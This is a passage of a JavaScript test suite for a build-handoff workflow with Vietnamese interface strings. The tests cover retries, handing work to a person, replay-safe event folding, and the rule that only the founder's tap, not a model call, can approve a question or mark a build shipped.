  await p.fold();
  assert.deepEqual([p.h(one).state, p.h(two).state, p.h(two).ticket], ['released', 'spawned', T2]);
  assert.equal(p.s.w.rows('topics').filter(t => t.kind === 'launch').length, 1);
});

test('Chạy lại on a folded blocked handoff restarts the build on the same ticket; the stopped event read again at the cursor does not flip it back', async () => {
  const p = await pair();
  await p.pull();
  p.m.b.ticket(T1, { status: 'blocked' });
  const stopped = await p.watch();
  assert.deepEqual([stopped.changed, stopped.raise], [[{ ref: p.ref, state: 'blocked' }], undefined]);
  const folded = await p.fold();
  assert.equal(p.h().state, 'blocked');
  assert.deepEqual(folded.raise.map(c => c.id), [`company:blocked:${p.ref}`]);
  // Nobody asked for a restart yet: the Mac leaves a stopped build alone.
  assert.equal((await p.pull()).done, true);
  const retry = await p.page('retry_handoff');
  assert.equal(retry.handoff.state, 'approved');
  assert.deepEqual([p.h().state, p.h().ticket], ['approved', T1]);
  // The queue is insert-only: the last event is read again at the cursor and must not undo the founder's Chạy lại.
  assert.deepEqual(await p.fold(), { done: true });
  assert.equal(p.h().state, 'approved');
  const again = await p.pull();
  assert.deepEqual(again.started, [{ handoff: p.ref, state: 'spawned' }]);
  assert.equal(of(p.m.b.calls(), 'ensure').length, 1, 'no second ticket: the retry resumes bs-tkt00001');
  assert.equal(of(p.m.b.calls(), 'spawn').length, 2);
  assert.match(of(p.m.b.calls(), 'spawn').at(-1).argv.at(-1), new RegExp(`BABYSIT_TICKET=${T1} .*builder ${T1}'$`));
  assert.equal(p.events().at(-1).state, 'started');
  await p.fold();
  assert.equal(p.h().state, 'spawned');
  // The ticket still says blocked until the new session writes its own status: believed again only after the grace.
  assert.deepEqual(await p.watch(), { done: true });
  assert.equal(p.build().state, 'spawned');
  p.m.w.now += RESTART_GRACE_MS + 60_000;
  assert.deepEqual((await p.watch()).changed, [{ ref: p.ref, state: 'blocked' }]);
  assert.equal(p.events().at(-1).state, 'stopped');
  // A second Chạy lại, and this time the session writes its status in time.
  await p.fold();
  await p.page('retry_handoff');
  await p.pull();
  p.m.b.ticket(T1, { status: 'in_progress' });
  assert.deepEqual((await p.watch()).changed, [{ ref: p.ref, state: 'building' }]);
  assert.equal(of(p.m.b.calls(), 'ensure').length, 1);
});

test('a stopped build the server never heard of is not restarted: only the founder\'s Chạy lại sends it back', async () => {
  const p = await pair();
  p.m.cli.flag('fail-insert', true);
  await p.pull();
  p.m.b.ticket(T1, { status: 'blocked' });
  const stuck = await p.watch();
  assert.deepEqual(stuck.events, { sent: 0, unsent: 1 });
  assert.deepEqual([p.build().state, p.build().pushed, p.h().state], ['blocked', null, 'approved']);
  assert.equal((await p.pull()).done, true, 'the server row is the first Go, not a Chạy lại');
  assert.equal(of(p.m.b.calls(), 'spawn').length, 1);
});

test('Giao người làm on a folded blocked handoff: the Mac stops watching, the half-done change keeps the checkout until the person is done, and Để Soot dựng resumes the ticket', async () => {
  const p = await pair({ items: [ITEM.product, OTHER] });
  const [one, two] = p.refs;
  await p.pull();
  await p.fold();
  await assert.rejects(p.page('to_person', {}, one), /Không có bản dựng nào đang dừng/, 'spawned is running');
  p.m.b.ticket(T1, { status: 'blocked' });
  await p.watch(); await p.fold();
  const out = await p.page('to_person', {}, one);
  assert.equal(out.handoff.state, 'task');
  assert.match(out.handoff.note, /còn nằm chưa commit trong kho mã trên máy dựng \(ticket bs-tkt00001\)/);
  assert.deepEqual([p.h(one).state, p.h(one).ticket], ['task', T1]);
  const given = await p.watch();
  assert.deepEqual(given.changed, [{ ref: one, state: 'task' }]);
  assert.deepEqual([p.build(one).state, p.build(one).ticket, p.build(one).repo], ['task', T1, p.m.repo]);
  const before = p.m.b.calls().length, sent = p.events().length;
  assert.deepEqual(await p.watch(), { done: true });
  assert.deepEqual([p.m.b.calls().length, p.events().length], [before, sent], 'a person\'s task is neither read nor reported');
  // The half-done change is still in the checkout: the queued Go waits for the person.
  assert.deepEqual((await p.pull()).skipped, [{ handoff: two, why: 'checkout_busy' }]);
  // Để Soot dựng: back to approved on the server, and the Mac continues the same ticket.
  assert.equal((await p.page('retry_handoff', {}, one)).handoff.state, 'approved');
  await p.watch();
  const back = await p.pull();
  assert.deepEqual(back.started, [{ handoff: one, state: 'spawned' }]);
  assert.equal(of(p.m.b.calls(), 'ensure').length, 1);
  await p.fold();
  assert.equal(p.h(one).state, 'spawned');
  // Given to a person again, who finishes it: the server row is released and the Mac frees the checkout for the next Go.
  p.m.w.now += RESTART_GRACE_MS + 60_000;
  await p.watch(); await p.fold();
  assert.equal(p.h(one).state, 'blocked');
  await p.page('to_person', {}, one);
  await p.watch();
  assert.equal((await p.pull()).done, true);
  await p.page('task_done', {}, one);
  assert.deepEqual((await p.watch()).changed, [{ ref: one, state: 'released' }]);
  assert.deepEqual((await p.pull()).started, [{ handoff: two, state: 'spawned' }]);
});

test('only the founder\'s tap on the Công ty page answers a question or says a build shipped: a model call is refused', async () => {
  const p = await pair();
  await p.pull();
  p.m.b.ticket(T1, { status: 'backlog', approval: ask('Confirm the spec') });
  await p.watch(); await p.fold();
  for (const extra of [{}, { page: { page: 'goals' } }]) {
    await assert.rejects(p.s.w.call('page_action', { op: 'answer', id: p.ref, action: 'approve', request_id: rid() }, extra), /Soot không tự quyết/);
    await assert.rejects(p.s.w.call('page_action', { op: 'shipped', id: p.ref, request_id: rid() }, extra), /Soot không tự quyết/);
  }
  assert.deepEqual([p.h().state, p.h().answer, p.h().released_at], ['asking', null, null]);
  await p.watch();
  assert.equal(of(p.m.b.calls(), 'resolve').length, 0);
});

test('an event that could not be sent stays unsent and goes out on the next team_watch', async () => {
  const s = await server();
  const row = await approvedRow(s);
  const m = mac();
  m.cli.rows([row]);
  m.cli.flag('fail-insert', true);
  await m.w.call('builds_pull');
  assert.equal(m.w.rows('builds')[0].state, 'spawned');
  assert.equal(m.w.rows('builds')[0].pushed, null, 'not reported yet');
  const stuck = await m.w.call('team_watch');
  assert.deepEqual(stuck.events, { sent: 0, unsent: 1 });
  m.cli.flag('fail-insert', false);
  const sent = await m.w.call('team_watch');
  assert.deepEqual(sent.events, { sent: 1, unsent: 0 });
  assert.deepEqual(m.cli.inserts().map(r => r.state), ['started']);
});

test('handoff_events_apply folds in order, each event once, treats released as final, skips strangers and replays safely', async () => {
  const s = await server();
  await s.go();
  const ev = (state, extra = {}) => s.w.store.insert('handoff_events', { handoff: s.ref, state, ticket: T1, at: new Date(s.w.now).toISOString(), ...extra });
  await ev('started');
  await ev('progress', { note: 'Đang dựng và tự kiểm (review, QA).' });
  await s.w.store.insert('handoff_events', { handoff: 'OP-FFFFFFFF', state: 'started' });
  await s.w.store.insert('handoff_events', { handoff: s.ref, state: 'exploded' });
  await s.w.store.insert('handoff_events', { handoff: s.ref, state: 'started', product: 'someone-else' });
  const first = await s.w.call('handoff_events_apply');
  assert.deepEqual(first.changed.map(c => c.state), ['spawned', 'building']);
  assert.deepEqual(first.skipped.map(x => x.why).sort(), ['bad_state', 'other_product', 'unknown_handoff']);
  assert.equal(first.notify, false);
  const h = () => s.w.rows('handoffs')[0];
  assert.deepEqual([h().detail, h().ticket], ['Đang dựng và tự kiểm (review, QA).', T1]);
  // A replay (the events at the cursor are read again) changes nothing.
  assert.equal((await s.w.call('handoff_events_apply')).done, true);
  assert.equal(h().state, 'building');
  // What an older build wrote for a team that broke still reads as a stopped build, with one card.
  await ev('failed', { note: 'release_failed p1' });
  const failed = await s.w.call('handoff_events_apply');
  assert.deepEqual([h().state, h().detail], ['blocked', 'Phiên dựng báo lỗi: release_failed p1']);
  assert.deepEqual(failed.raise.map(c => c.id), [`company:blocked:${s.ref}`]);
  // An event of the bbs:team days (it names a team) folds the same.
  await ev('started', { team_id: 'loop-x' });
  await s.w.call('handoff_events_apply');
  assert.equal(h().state, 'spawned', 'a session started again');
  s.w.now += DAY;
  await ev('shipped');
  const shipped = await s.w.call('handoff_events_apply');
  assert.deepEqual([shipped.changed[0].state, shipped.notify, shipped.outcomes.length], ['released', true, 1]);
  assert.equal(h().released_at, new Date(s.w.now).toISOString());
  await ev('progress');
  await ev('shipped');
  assert.equal((await s.w.call('handoff_events_apply')).done, true, 'released is final');
  assert.equal(h().state, 'released');
  assert.equal(s.w.rows('topics').filter(t => t.kind === 'launch').length, 1);
});

test('events never move a handoff that is with a person, released or dropped', async () => {
  const s = await server({}, [ITEM.product, OTHER, { ...ITEM.product, title: 'Nhắc nạp lại khi ví gần hết' }]);
  const [task, released, dropped] = s.refs;
  for (const ref of s.refs) await s.go(ref);
  const row = ref => s.w.rows('handoffs').find(h => h.opportunity === ref);
  const act = (op, ref) => s.w.call('page_action', { op, id: ref, request_id: rid() }, PAGE);
  await act('to_person', task);
  await act('to_person', released);
  await act('task_done', released);
  await s.w.store.insert('handoff_events', { handoff: dropped, state: 'dropped', ticket: T1 });
  await s.w.call('handoff_events_apply');
  assert.deepEqual(s.refs.map(r => row(r).state), ['task', 'released', 'dropped']);
  const stamp = row(released).released_at;
  for (const ref of s.refs) for (const state of ['started', 'progress', 'asking', 'stopped', 'handover', 'shipped', 'dropped']) await s.w.store.insert('handoff_events', { handoff: ref, state, ticket: T2, asked: A1, note: 'x' });
  const out = await s.w.call('handoff_events_apply');
  assert.deepEqual(out, { done: true });
  assert.deepEqual(s.refs.map(r => [row(r).state, row(r).ticket]), [['task', null], ['released', null], ['dropped', T1]]);
  assert.equal(row(released).released_at, stamp);
  assert.equal(s.w.rows('topics').filter(t => t.kind === 'launch').length, 0, 'a shipped event for a closed handoff records nothing');
});

test('a folded handoff has no repo of its own: a local team_watch on the server never reads it with bbs', async () => {
  const s = await server();
  await s.go();
  await s.w.store.insert('handoff_events', { handoff: s.ref, state: 'started', ticket: T1 });
  await s.w.call('handoff_events_apply');
  s.w.env.BBS_BIN = fakeBbs().bin;
  assert.equal(s.w.rows('handoffs')[0].state, 'spawned');
  assert.deepEqual(await s.w.call('team_watch'), { done: true });
  assert.equal(s.w.rows('handoffs')[0].state, 'spawned');
});
